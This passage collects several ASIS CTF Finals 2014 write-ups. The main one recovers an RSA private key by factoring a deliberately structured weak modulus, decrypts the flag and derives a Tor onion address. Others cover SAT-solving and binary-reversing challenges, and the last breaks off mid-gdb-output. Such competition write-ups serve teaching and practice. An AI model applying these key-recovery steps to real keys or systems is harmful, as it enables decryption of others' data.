Studying this image while keeping the hint in mind we notice that the first element became the third, hence `1 --> 3`. Let’s try to do this mapping for all the changes. We propably only need to focus on the numbers as the hint suggested. Below you can see a map with only the numbers so we can focus more on the important things.

```
numbers from the original image:

1                                                               2
4   5                                       8   9   14  18  20  22  3
16  27                                      32  65  71  72  74  47  13
31  40  21  26  30  7   17  19  6   10  11  12  15  75  78  87  60  44
54  58  38  49  55  57  68  73  23  28  34  35  36  37  90  91  96  48
66  100 62  99  29  43  53  80  41  42  52  64  76  88  89  94  25  50
24  45  46  92  97  61  63  79  84  33  39  56  59  67  82  85  86  92


numbers from our challenge image (only the ones on an incorrect position):

3                                                               24
80  83                                      26  6   56  83  1   86  87
77  18                                      37                      43
52  50  90      41  26  14  22  20  94      74  71                  29
        84                      12  21  74  17  39  95
                19  24          98  54                          62
94  15                              51  62
```

Note that 43 elements are in the wrong place BUT if you include the two elements that had an `\*` next to their number, that totals up to 45 elements. Even more curious is they are on the positions coresponding to the first 45 elements. So the elements going from `1` to `45` of the original image are replaced by a different element (with a different number) in our given image.

Then we got the idea of making a large string. At position `1` is number `3`, at position `2` we would have `24`, number `87` is at position `3` and so on. This gives us the following string:

```
032487808320262606941174435671771483220190861294622618211941523751741739958462509854242915
```

Maybe this number means something? Let’s take this integer and format it in hexadecimal notation.

```bash
$ python -c 'print "%x" % 32487808320262606941174435671771483220190861294622618211941523751741739958462509854242915'
415349535f6339613163643231646235643338393233353632666363616262636138303863
```

Then let’s translate that hex to ASCII text, in case it gives us another hint:

```bash
$ xxd -r -p <<< '415349535f6339613163643231646235643338393233353632666363616262636138303863'
ASIS_c9a1cd21db5d38923562fccabbca808c
```

The flag is `ASIS\_c9a1cd21db5d38923562fccabbca808c`.

## Other write-ups and resources

* <http://blogs.univ-poitiers.fr/e-laize/2014/10/13/asis-2014-ptot/>
# ASIS Cyber Security Contest Finals 2014 write-ups

* <http://asis-ctf.ir/>
* [Scoreboard](http://asis-ctf.ir/scoreboard/) or [local alternative](scoreboard.txt)

## Completed write-ups

* [A familiar system](a-familiar-system)
* [ASIS calc](asis-calc)
* [CapLow](caplow)
* [Capsule](capsule)
* [Echo](echo)
* [Fact or Real?](fact-or-real)
* [How much exactly?](how-much-exactly)
* [Important day!](important-day)
* [Lion Cub](lion-cub)
* [Lottery](lottery)
* [Mask](mask)
* [Match the pair](match-the-pair)
* [Natural algorithm](natural-algorithm)
* [Numdroid](numdroid)
* [PTOT](ptot)
* [RSA in real world!](rsa-in-real-world)
* [Satellite reloaded](satellite-reloaded)
* [Satellite](satellite)
* [Secure hobby](secure-hobby)
* [TicTac](tictac)
* [Ultra Secure](ultra-secure)
* [Voting](voting)
* [What you see?](what-you-see)
* [XORQR](xorqr)

## External write-ups only

* none yet

## Missing write-ups

* [Antenna](antenna)
* [Square](square)
* [Stop!](stop)
# ASIS Cyber Security Contest Finals 2014: RSA in real world!

**Category:** Crypto, Recon
**Points:** 250
**Description:**

> Download [file](rsa_20bdc0fc3b3b06f7a5f920abb4dddfca) and capture the flags!!!

## Write-up

Write-up by [HacknamStyle](http://hacknamstyle.net). Let’s see what [the provided file](rsa_20bdc0fc3b3b06f7a5f920abb4dddfca) could be:

```bash
$ file rsa_20bdc0fc3b3b06f7a5f920abb4dddfca
rsa_20bdc0fc3b3b06f7a5f920abb4dddfca: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < rsa_20bdc0fc3b3b06f7a5f920abb4dddfca > rsa`
* `unxz < rsa_20bdc0fc3b3b06f7a5f920abb4dddfca > rsa`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x rsa_20bdc0fc3b3b06f7a5f920abb4dddfca
```

Let’s find out what the extracted file is:

```bash
$ file rsa
rsa: gzip compressed data, from Unix, last modified: Sun Oct 12 12:02:01 2014
```

The rabbit hole goes deeper…

```bash
$ gunzip < rsa > rsa-unzipped

$ file rsa-unzipped
rsa-unzipped: POSIX tar archive

$ tar vxf rsa-unzipped
x RSA/
x RSA/flag.enc
x RSA/pubkey.pem
```

We have a public key `pubkey.pem` and an encrypted file `flag.enc`. How to obtain the private key to decrypt the flag?

## Factoring the Public Key

Let's use `openssl` to see the public key we are dealing with.

```bash
$ openssl rsa -in pubkey.pem -pubin -text -modulus
Public-Key: (1024 bit)
Modulus:
    00:80:00:00:00:20:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:08:00:00:00:
    02:00:08:00:00:00:02:00:00:00:00:00:00:08:00:
    00:00:00:01:0c:80:00:00:15:e0:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:80:00:00:00:00:0b:
    d0:00:00:00:00:0b:50:00:00:00:00:00:00:00:00:
    00:05:78:00:00:00:00:7b:bb
Exponent: 65537 (0x10001)
Modulus=8000000020000000000000000000000000000000000000000000000000000000000000000000000008000000020008000000020000000000000800000000010C80000015E0000000000000000000000000000000000000000000000000000000000080000000000BD0000000000B500000000000000000000578000000007BBB
```

That modulus contains a lot of zeros. Interestingly, last year there was a [similar RSA challenge in ASIS CTF](http://security.cs.pub.ro/hexcellents/wiki/writeups/asis_rsang). In that challenge they used the bit patterns to guess how the modulus was generated, and relied on that formula to efficiently factorize the modulus. Let's convert the modulus to binary and try to spot all the patterns:

```bash
$ python -c 'print bin(0x8000000020000000000000000000000000000000000000000000000000000000000000000000000008000000020008000000020000000000000800000000010C80000015E0000000000000000000000000000000000000000000000000000000000080000000000BD0000000000B500000000000000000000578000000007BBB)'
0b10000000000000000000000000000000001000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000000000000
0000000000100000000000000000000000000000000010000000000000100000000000000000000
0000000000000100000000000000000000000000000000000000000000000000000100000000000
0000000000000000000000000000000100001100100000000000000000000000000101011110000
0000000000000000000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000000001000
0000000000000000000000000000000000000000101111010000000000000000000000000000000
0000000001011010100000000000000000000000000000000000000000000000000000000000000
000000000000000000010101111000000000000000000000000000000000000111101110111011
```

We can spot 14 "chunks" of `1`'s and `0`'s separated by many zeros. These form interesting patterns:

1. `10101111` occurs twice
2. `10110101` occurs _almost_ twice. The second occurrence would be `10111101` but it has an additional `1` in the middle.
3. `111101110111011` is equal to `bin(0b10101111 * 0b10110101)`. This already hints that the formula is of the form `(... + A) * (... + B)` where `A` is `0b10110101`, and `B` is `0b10101111`. After all, the polynomial expansion would end in `(... + A * B)`, and we indeed see this product at the end of the modulus.
4. Interestingly, the chunk `1000011001` is equal to `bin(0b10101111 + 0b10110101 * 0b10)`. This hints that both `A` and `B` where multiplied by an almost equal power of two, and then added (causing the overlap). Potential overlaps also explain the additional `1` in the second occurence of `10110101` (see point 2).

Taking all this together, we have a formula of the form `(... + A) * (... + B)` where `A` is `0b10110101`, and `B` is `0b10101111`. In the polynomial expansion there are two "overlaps" between terms (see point 2 and 4 form the pattern list above). Since there are 14 visible chunks, and two overlaps, we can deduce that the polynomial expansion has 16 terms. Additionally we know that both `A` and `B` each occur three terms in the polynomial expansion (e.g. for `10101111` these are the two occurrences of itself, and in the overlap mentioned in point 4). So finally we get that the modulus was generated by the following formula:

```python
A = 0b10110101
B = 0b10101111
(2**a + 2**b + 2**c + A) * (2**d + 2**e + 2**f + B)
```

Let `a` and `d` be the smallest exponents in each term, and `c` and `d` the second smallest exponent in each term. Once we have this formula, determining the exponents can be done as follows:

1. The first occurrence of `B` in the modulus is caused by `B * 2**51`, so we have `a = 51`. Similarly, the first occurrence of `A` in the modulus is caused by `A * 2**140`, so we have `d = 140`.
2. Remark that `2**(a+d) = 2**191`. This is a lone `1` that overlaps with `A * 2**188`! In other words, the chunk `10111101` that we saw previously is caused by `2**(a+d) + A * 2**188` (this confirms we're definitely on the right track). From this we also learn that `e = 188`.
3. We can also derive that `1000011001` is caused by `A * 2**512 + B * 2**511`. So we got `c = 511` and `f = 512`
3. Finally looking at some lone `1`'s we get `b = 477`.

The factorization becomes:

```python
>>> print "p:", (2**a + 2**b + 2**c + A)
6703903965361517118576511528025622717463828698514771456694902115718276634989944955753407851598489976727952425488221391817052769267904281935379659980013749
>>> print "q:", (2**d + 2**e + 2**f + B)
13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903820008890319855427587165500997237443558735689450602365103
>>> print "Factorized:", p*q == modulus
True
```

## Generating Private Key and Decrypting

Using [`rsatool.py`](https://github.com/ius/rsatool/blob/master/rsatool.py) we generate a private key from `p` and `q`:

```bash
$ ./rsatool.py -p 6703903965361517118576511528025622717463828698514771456694902115718276634989944955753407851598489976727952425488221391817052769267904281935379659980013749 -q 13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903820008890319855427587165500997237443558735689450602365103 -o private.pem
[...]
Saving PEM as private.pem
$ cat private.pem
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAIA
CAAAAAIAAAAAAAAIAAAAAAEMgAAAFeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAA
C9AAAAAAC1AAAAAAAAAAAAAFeAAAAAB7uwIDAQABAoGAah4V4gSlm1pkpZtaZKWbWmSlm1pkpZta
ZKWbWmSlm1pkpZtaZKWbWmtHfLiE7/ux7E4VWmSlm1pkrD07wsQ+GR2F4owloppdZaKaXWWiml1l
oppdZaKaXWWiml1loppdZaMEe3uEhIU5R4a4eVDaXWWiml1loppdaiShi151BvkCQQCAAAAAIAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAC1
AkEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAABAAAAAAAAAA
AAAAAAAAAAAArwJACpD1bw01MsrNNTLKzTUyys01MsrNNTLKzTUyys01MsrNNTLKzTUyys01MsrN
NTLKzTUyys01MsrNNdvaJCXb6QJBAP0TAuz9EwLs/RMC7P0TAuz9EwLs/RMC7P0TAuz9EwLs/RMC
7P0TAu0M5DMbzORC7P0TAuz9EwLs/RMC7P0TA5kCQEQP2f/yE0zeS2vDoF/vHP3qD8MFnj5oY0oN
TsXoUTHUqa87BFWkOP0My4pc8UIResigL/QWrpOjNRAf8YRAzp4=
-----END RSA PRIVATE KEY-----
```

And we decrypt `flag.enc`, which contains a base64 encoded string, using the following python script:

```python
def decrypt_RSA(private_key_loc, package):
    from Crypto.PublicKey import RSA 
    from Crypto.Cipher import PKCS1_OAEP 
    from base64 import b64decode 
    key = open(private_key_loc, "r").read() 
    rsakey = RSA.importKey(key) 
    rsakey = PKCS1_OAEP.new(rsakey) 
    decrypted = rsakey.decrypt(b64decode(package)) 
    return decrypted
flag = "eItbvkj78nP6H1H5M1vE9HIJwP/yNuSHsLUQyiEsvISZkQsdHvHa6TUgMNcn11QRrkKaLoDIjyBxTRMi+eTJA27ojvpmfTTRUmWn1f8Yo+yBrnaUTEDKf911R4c614SwvMOdv2wQjRDnVQ2s5nxSvW8q3/FzTOgBaWDkp0Qko54="
print decrypt_RSA('private.pem', flag)
```

Let's run this:

```bash
$ python decrypt.py 
We setup private server somewhere, can you find the url of it: ASIS_md5(url)
```

## Oh hell naw?! RECON?!?!

So we have to find the URL of a **private** server which is located **somewhere**. In this case a **private** server means a hidden Tor service/server. The URL we have to find is a `.onion` address. [The Tor documentation](https://trac.torproject.org/projects/tor/wiki/doc/HiddenServiceNames) explains how such addresses are generated:

> If you decide to run a hidden service Tor generates an ​RSA-1024 keypair. The .onion name is computed as follows: first the ​**SHA1 hash of the ​DER-encoded ​ASN.1 public key** is calculated. Afterwards the **first half of the hash is encoded to ​Base32** and the suffix ".onion" is added. Therefore .onion names can only contain the digits 2-7 and the letters a-z and are exactly 16 characters long.

Let's calculate the `.onion` address for our public/private key combination and the resulting flag:

```bash
$ openssl rsa -in private.pem -pubout -outform DER |python -c 'import sys,hashlib,base64;\
print base64.b32encode(hashlib.sha1(sys.stdin.read()[22:]).digest()[:10]).lower()'
writing RSA key
2ekrevuoueus267z
$ echo -n "2ekrevuoueus267z.onion" | md5sum
f4fa90d969aab09c660a774303d7cd77
```

So the URL is `2ekrevuoueus267z.onion` which gives the flag:

    ASIS_f4fa90d969aab09c660a774303d7cd77

I hate RECON challenges so much.

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Finals 2014: Satellite

**Category:** PPC
**Points:** 200
**Description:**

> Connect here and find the flag:
>
> ```bash
> nc asis-ctf.ir 12435
> ```

## Write-up

On connecting to the server, we get the following message:

```
hi all,  You must send a string for each level that would make the literal True
send "Sattelite"
```

When we sent `Sattelite` (sic), the server responded with [a SAT formula](https://en.wikipedia.org/wiki/Boolean_satisfiability_problem), such as:

```
(x4 ∨ x5) ∧ (¬x3 ∨ ¬x1) ∧ (¬x3 ∨ x5) ∧ (x3 ∨ ¬x4) ∧ (x1 ∨ ¬x5)
```

That’s easy! Or at least it’s easy when you know logic and SAT. There are many SAT solvers, so just picking one of them and feeding them the formula should work. We chose `picosat`, because it has Python bindings through `pycosat`.

After transforming the input format into a format that `picosat` can read, we got a valid solution. On IRC we found out the format of the solution should be `11001` for the result `x1 ∧ x2 ∧ ¬x3 ∧ ¬x4 ∧ x5`. That’s also easy to transform, given the solution.

The only problem left is that sometimes, not all variables are used in the clauses (such as in our case the variable `x2`). We need to do a manual adjustment for that… First of all, if a missing variable has a lower number then the largest variable, this is not a problem, as `picosat` can solve that for itself. If a missing variable is larger then the largest variable, we need to append the result with some more ones or zeroes.

Using [the `solve.py` script](solve.py), we solve all the SAT formulas and get the flag `ASIS\_5b5e15ec25479ac8b743c6e818d75464`.

## Other write-ups and resources

* <http://tasteless.eu/2014/10/asis-ctf-finals-2014-sattelite-ppc-200/>
* <https://ctfcrew.org/writeup/81>
* <http://bruce30262.logdown.com/posts/237394-asis-ctf-finals-2014-satellite>
# ASIS Cyber Security Contest Finals 2014: Satellite reloaded

**Category:** Reverse
**Points:** 250
**Description:**

> Download [this](2satreloaded_465509d872885f2a92656e29d3881ad6) file and find the flag.

## Write-up

Let’s see what [the provided file](2satreloaded_465509d872885f2a92656e29d3881ad6) could be:

```bash
$ file 2satreloaded_465509d872885f2a92656e29d3881ad6
2satreloaded_465509d872885f2a92656e29d3881ad6: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < 2satreloaded_465509d872885f2a92656e29d3881ad6 > sat`
* `unxz < 2satreloaded_465509d872885f2a92656e29d3881ad6 > sat`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x 2satreloaded_465509d872885f2a92656e29d3881ad6
```

Let’s find out what the extracted file is:

```bash
$ file sat
sat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, stripped
```

## The Dirty Work

Let's run the program

```bash
$ ./2satreloaded 
Try harder!
```

After trying some arguments, we still get "Try harder!". Time to fire up IDA and reverse the binary. The first thing we notice is that on start-up it decrypts some global variable. Let's inspect this variable once it's decrypted:


```gdb
(gdb) b *0x401004
Breakpoint 1 at 0x401004
(gdb) r
Starting program: ./2satreloaded 

Breakpoint 1, 0x0000000000401004 in ?? ()
(gdb) set print elements 0
(gdb) x/s 0x604320
0x604320:	"( a[253] | ! a[218] ) & ( ! a[92] | ! a[46] ) & ( ! a[2] | ! a[285] ) & ( ! a[275] | ! a[256] ) & ( ! a[118] | ! a[141] ) & ( a[118] | ! ! a[141] ) & ( a[19] | ! a[154] ) & ( a[272] | ! a[208] ) & ( a[249] | ! a[171] ) & ( a[84] | ! a[196] ) & ( ! a[119] | ! ! a[216] ) & ( ! a[33] | ! a[277] ) & ( a[45] | a[73] ) & ( ! a[238] | a[225] ) & ( ! a[292] | ! a[206] ) & ( a[165] | ! a[217] ) & ( ! a[102] | ! a[271] ) & ( ! a[7] | ! ! a[111] ) & ( ! a[71] | ! a[91] ) & ( ! a[29] | ! a[274] ) & ( a[29] | ! ! a[274] ) & ( a[260] | ! a[6] ) & ( ! a[49] | ! a[239] ) & ( ! a[107] | a[209] ) & ( a[150] | ! ! a[120] ) & ( ! a[155] | ! a[243] ) & ( ! a[267] | ! ! a[207] ) & ( a[169] | ! a[203] ) & ( a[69] | ! a[276] ) & ( ! ! a[9] | ! a[287] ) & ( a[42] | a[221] ) & ( ! ! a[11] | a[112] ) & ( ! ! a[148] | ! a[3] ) & ( a[262] | ! a[188] ) & ( ! a[280] | ! a[55] ) & ( ! a[150] | ! a[120] ) & ( ! a[11] | a[112] ) & ( a[109] | ! a[139] ) & ( ! a[260] | a[6] ) & ( ! a[126] | ! a[279] ) & ( a[286] | ! a[106] ) & ( ! ! a[20] | a[30] ) & ( a[123] | ! ! a[82] ) & ( ! a[174] | a[66] ) & ( a[249] | ! ! a[171] ) & ( ! a[33] | a[277] ) & ( ! a[246] | a[97] ) & ( a[201] | ! a[110] ) & ( ! ! a[143] | ! a[83] ) & ( ! ! a[7] | ! a[111] ) & ( ! ! a[47] | ! a[79] ) & ( a[172] | ! a[291] ) & ( ! a[164] | ! a[204] ) & ( a[144] | ! a[48] ) & ( ! a[47] | ! ! a[79] ) & ( ! a[20] | ! a[30] ) & ( a[50] | a[153] ) & ( ! a[242] | a[74] ) & ( a[113] | a[37] ) & ( ! ! a[191] | ! a[93] ) & ( ! a[160] | ! a[159] ) & ( ! a[98] | a[8] ) & ( a[132] | ! a[138] ) & ( ! a[247] | ! a[158] ) & ( ! a[238] | ! a[225] ) & ( ! a[2] | a[285] ) & ( a[122] | ! ! a[215] ) & ( ! a[113] | a[37] ) & ( ! a[261] | ! ! a[17] ) & ( ! a[231] | ! ! a[31] ) & ( ! ! a[147] | a[177] ) & ( a[174] | ! a[66] ) & ( ! a[245] | a[117] ) & ( a[29] | ! a[274] ) & ( a[129] |---Type <return> to continue, or q <return> to quit---
 ! a[251] ) & ( ! a[143] | ! ! a[83] ) & ( a[57] | ! a[173] ) & ( ! a[253] | a[218] ) & ( ! a[259] | a[142] ) & ( ! a[96] | ! ! a[162] ) & ( a[130] | ! ! a[88] ) & ( a[129] | ! ! a[251] ) & ( ! a[265] | ! a[192] ) & ( ! ! a[292] | ! a[206] ) & ( ! a[257] | a[266] ) & ( a[90] | ! a[75] ) & ( a[194] | ! ! a[244] ) & ( a[253] | a[218] ) & ( a[240] | a[190] ) & ( ! a[144] | ! a[48] ) & ( ! a[0] | a[100] ) & ( ! a[71] | a[91] ) & ( ! ! a[275] | ! a[256] ) & ( a[122] | ! a[215] ) & ( ! a[94] | a[241] ) & ( a[42] | ! a[221] ) & ( ! ! a[175] | a[200] ) & ( ! ! a[232] | a[198] ) & ( ! ! a[127] | ! a[15] ) & ( ! ! a[152] | ! a[25] ) & ( ! a[67] | ! a[18] ) & ( ! a[288] | a[176] ) & ( a[286] | a[106] ) & ( ! a[96] | ! a[162] ) & ( ! a[61] | ! ! a[64] ) & ( a[262] | a[188] ) & ( a[102] | ! ! a[271] ) & ( ! a[212] | ! a[63] ) & ( ! a[57] | ! a[173] ) & ( ! a[28] | a[41] ) & ( ! a[247] | ! ! a[158] ) & ( a[32] | ! a[185] ) & ( ! a[130] | ! a[88] ) & ( a[89] | ! a[161] ) & ( a[193] | ! a[168] ) & ( ! a[5] | a[195] ) & ( a[265] | ! a[192] ) & ( ! ! a[167] | ! a[179] ) & ( ! a[167] | ! a[179] ) & ( ! a[28] | ! a[41] ) & ( ! a[258] | ! a[163] ) & ( ! a[267] | ! a[207] ) & ( ! ! a[2] | a[285] ) & ( ! ! a[155] | ! a[243] ) & ( a[205] | ! a[137] ) & ( ! ! a[71] | a[91] ) & ( ! a[44] | ! a[128] ) & ( ! a[222] | a[273] ) & ( ! ! a[261] | ! a[17] ) & ( ! ! a[52] | ! a[283] ) & ( a[16] | ! a[135] ) & ( a[65] | ! ! a[43] ) & ( ! ! a[96] | ! a[162] ) & ( ! a[59] | ! ! a[199] ) & ( a[250] | ! ! a[51] ) & ( a[250] | ! a[51] ) & ( ! a[99] | a[24] ) & ( ! a[40] | ! a[145] ) & ( ! a[7] | ! a[111] ) & ( ! a[5] | ! a[195] ) & ( a[26] | ! a[180] ) & ( a[121] | ! ! a[23] ) & ( ! a[269] | ! ! a[58] ) & ( ! ! a[210] | a[213] ) & ( ! a[294] | a[10] ) & ( a[234] | ! a[34] ) & ( ! a[184] | ! a[39] ) & ( ! a[250] | ! a[51] ) & ( ! a[127] | ! a[15] ) ---Type <return> to continue, or q <return> to quit---
& ( ! a[134] | ! a[293] ) & ( ! a[261] | ! a[17] ) & ( a[0] | ! a[100] ) & ( a[68] | ! a[149] ) & ( ! a[60] | a[182] ) & ( ! a[197] | a[80] ) & ( ! a[21] | ! a[151] ) & ( ! a[272] | a[208] ) & ( ! ! a[33] | a[277] ) & ( ! a[232] | ! a[198] ) & ( ! ! a[134] | ! a[293] ) & ( ! a[119] | ! a[216] ) & ( ! a[210] | a[213] ) & ( ! a[156] | ! a[181] ) & ( a[184] | ! ! a[39] ) & ( ! ! a[60] | a[182] ) & ( ! a[275] | ! ! a[256] ) & ( ! a[264] | a[62] ) & ( ! ! a[99] | a[24] ) & ( ! a[166] | ! a[76] ) & ( ! a[187] | ! ! a[224] ) & ( ! a[234] | a[34] ) & ( ! a[186] | ! ! a[95] ) & ( ! a[284] | a[270] ) & ( ! ! a[269] | ! a[58] ) & ( ! ! a[263] | ! a[115] ) & ( a[98] | ! a[8] ) & ( ! a[103] | ! a[236] ) & ( a[0] | a[100] ) & ( ! a[59] | ! a[199] ) & ( ! a[67] | ! ! a[18] ) & ( a[150] | ! a[120] ) & ( a[230] | ! ! a[54] ) & ( a[226] | ! a[116] ) & ( ! ! a[247] | ! a[158] ) & ( ! ! a[77] | ! a[178] ) & ( ! a[172] | ! a[291] ) & ( ! a[281] | ! a[104] ) & ( ! a[1] | a[14] ) & ( a[265] | ! ! a[192] ) & ( ! ! a[187] | ! a[224] ) & ( ! ! a[197] | a[80] ) & ( a[19] | a[154] ) & ( a[289] | ! ! a[237] ) & ( ! ! a[67] | ! a[18] ) & ( a[132] | a[138] ) & ( ! a[114] | ! a[27] ) & ( a[165] | a[217] ) & ( ! a[56] | ! a[183] ) & ( ! ! a[278] | ! a[87] ) & ( a[126] | ! ! a[279] ) & ( ! a[19] | a[154] ) & ( a[258] | ! a[163] ) & ( ! a[191] | ! ! a[93] ) & ( a[288] | ! a[176] ) & ( ! ! a[212] | ! a[63] ) & ( ! a[197] | ! a[80] ) & ( ! a[61] | ! a[64] ) & ( ! ! a[146] | a[233] ) & ( ! a[44] | ! ! a[128] ) & ( ! a[129] | ! a[251] ) & ( a[65] | ! a[43] ) & ( a[230] | ! a[54] ) & ( ! a[152] | ! a[25] ) & ( ! a[146] | a[233] ) & ( ! a[170] | ! ! a[282] ) & ( a[26] | ! ! a[180] ) & ( ! a[78] | ! ! a[248] ) & ( ! a[9] | ! a[287] ) & ( a[32] | a[185] ) & ( ! a[92] | ! ! a[46] ) & ( ! ! a[231] | ! a[31] ) & ( a[226] | ! ! a[116] ) & ( ! a[127] | ! !---Type <return> to continue, or q <return> to quit---
 a[15] ) & ( ! ! a[21] | ! a[151] ) & ( ! a[278] | ! ! a[87] ) & ( a[280] | ! a[55] ) & ( ! a[131] | ! a[38] ) & ( ! a[193] | a[168] ) & ( ! a[52] | ! ! a[283] ) & ( ! a[249] | ! a[171] ) & ( ! ! a[264] | a[62] ) & ( ! a[77] | ! a[178] ) & ( a[16] | ! ! a[135] ) & ( a[294] | ! a[10] ) & ( ! ! a[170] | ! a[282] ) & ( a[234] | a[34] ) & ( ! a[290] | ! a[211] ) & ( ! ! a[156] | ! a[181] ) & ( a[245] | ! a[117] ) & ( ! ! a[189] | ! a[214] ) & ( ! a[136] | ! ! a[235] ) & ( ! a[167] | ! ! a[179] ) & ( ! a[187] | ! a[224] ) & ( a[172] | ! ! a[291] ) & ( ! ! a[186] | ! a[95] ) & ( ! a[89] | a[161] ) & ( a[257] | ! a[266] ) & ( a[288] | a[176] ) & ( a[245] | a[117] ) & ( a[113] | ! a[37] ) & ( ! ! a[40] | a[145] ) & ( ! a[166] | a[76] ) & ( a[118] | ! a[141] ) & ( a[22] | ! a[85] ) & ( ! ! a[70] | ! a[124] ) & ( ! ! a[255] | a[105] ) & ( ! a[136] | ! a[235] ) & ( ! a[286] | a[106] ) & ( ! ! a[92] | ! a[46] ) & ( ! ! a[1] | a[14] ) & ( a[56] | ! ! a[183] ) & ( ! a[78] | ! a[248] ) & ( ! ! a[246] | a[97] ) & ( ! a[231] | ! a[31] ) & ( ! ! a[267] | ! a[207] ) & ( a[121] | ! a[23] ) & ( ! ! a[114] | ! a[27] ) & ( a[108] | ! ! a[202] ) & ( ! a[40] | a[145] ) & ( a[254] | a[86] ) & ( ! a[13] | a[35] ) & ( ! a[121] | ! a[23] ) & ( ! a[52] | ! a[283] ) & ( ! a[175] | a[200] ) & ( ! a[268] | ! a[36] ) & ( ! a[189] | ! a[214] ) & ( ! a[134] | ! ! a[293] ) & ( a[126] | ! a[279] ) & ( a[194] | ! a[244] ) & ( a[205] | a[137] ) & ( ! a[84] | ! a[196] ) & ( ! a[169] | ! a[203] ) & ( ! a[11] | ! a[112] ) & ( a[81] | ! ! a[252] ) & ( ! ! a[259] | a[142] ) & ( ! a[219] | ! a[227] ) & ( ! a[226] | ! a[116] ) & ( a[169] | ! ! a[203] ) & ( ! a[194] | ! a[244] ) & ( ! a[147] | ! a[177] ) & ( ! a[146] | ! a[233] ) & ( ! a[4] | ! ! a[72] ) & ( ! ! a[268] | a[36] ) & ( ! a[131] | a[38] ) & ( ! a[45] | a[73] ) & ( a[45] | ! a[73] ) & ( ! a[191---Type <return> to continue, or q <return> to quit---
] | ! a[93] ) & ( ! a[133] | a[157] ) & ( a[89] | a[161] ) & ( ! a[165] | a[217] ) & ( a[84] | ! ! a[196] ) & ( ! a[268] | a[36] ) & ( ! a[152] | ! ! a[25] ) & ( ! a[269] | ! a[58] ) & ( ! a[50] | a[153] ) & ( a[94] | ! a[241] ) & ( ! a[290] | ! ! a[211] ) & ( ! a[264] | ! a[62] ) & ( ! ! a[53] | a[229] ) & ( ! ! a[228] | ! a[12] ) & ( ! a[222] | ! a[273] ) & ( ! ! a[28] | a[41] ) & ( ! a[148] | ! a[3] ) & ( ! a[170] | ! a[282] ) & ( a[22] | ! ! a[85] ) & ( ! a[262] | a[188] ) & ( ! a[254] | a[86] ) & ( ! a[242] | ! a[74] ) & ( ! a[26] | ! a[180] ) & ( a[102] | ! a[271] ) & ( ! ! a[166] | a[76] ) & ( a[49] | ! a[239] ) & ( ! a[189] | ! ! a[214] ) & ( a[184] | ! a[39] ) & ( a[108] | ! a[202] ) & ( a[123] | ! a[82] ) & ( ! a[107] | ! a[209] ) & ( ! a[143] | ! a[83] ) & ( ! a[284] | ! a[270] ) & ( ! a[156] | ! ! a[181] ) & ( ! ! a[238] | a[225] ) & ( ! a[205] | a[137] ) & ( ! a[263] | ! a[115] ) & ( ! a[22] | ! a[85] ) & ( ! a[175] | ! a[200] ) & ( ! ! a[125] | ! a[140] ) & ( ! a[230] | ! a[54] ) & ( ! a[232] | a[198] ) & ( a[254] | ! a[86] ) & ( ! a[70] | ! a[124] ) & ( ! a[212] | ! ! a[63] ) & ( ! ! a[242] | a[74] ) & ( a[160] | ! ! a[159] ) & ( a[69] | ! ! a[276] ) & ( ! a[70] | ! ! a[124] ) & ( ! a[68] | ! a[149] ) & ( ! a[263] | ! ! a[115] ) & ( ! a[201] | a[110] ) & ( ! a[60] | ! a[182] ) & ( ! ! a[131] | a[38] ) & ( ! a[47] | ! a[79] ) & ( a[56] | ! a[183] ) & ( ! a[278] | ! a[87] ) & ( a[130] | ! a[88] ) & ( ! a[122] | ! a[215] ) & ( ! ! a[119] | ! a[216] ) & ( ! a[1] | ! a[14] ) & ( a[133] | ! a[157] ) & ( ! a[155] | ! ! a[243] ) & ( ! a[123] | ! a[82] ) & ( a[281] | ! ! a[104] ) & ( ! ! a[290] | ! a[211] ) & ( a[68] | ! ! a[149] ) & ( ! a[53] | ! a[229] ) & ( a[193] | a[168] ) & ( ! a[81] | ! a[252] ) & ( a[81] | ! a[252] ) & ( a[201] | a[110] ) & ( ! ! a[61] | ! a[64] ) & ( a[294] | a[10] ) & ( ! a[11---Type <return> to continue, or q <return> to quit---
